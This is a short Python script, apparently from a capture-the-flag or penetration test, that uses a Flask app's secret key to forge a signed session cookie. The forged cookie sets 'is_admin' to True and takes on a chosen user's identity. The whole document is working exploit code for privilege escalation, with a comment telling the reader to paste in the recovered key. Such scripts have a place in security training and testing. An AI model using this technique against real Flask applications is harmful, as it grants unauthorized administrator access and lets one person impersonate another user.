import json
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "fb_retro_secret_9831203912"  # <-- paste the key

# Craft your forged session data
session_data = {
    'user_first_name': 'innsan',
    'user_full_name': 'innsan mzian',
    'user_id': 12,
    'is_admin': True
}

# Sign and encode it
si = SecureCookieSessionInterface()
serializer = si.get_signing_serializer(app)
forged_cookie = serializer.dumps(session_data)

print(forged_cookie)
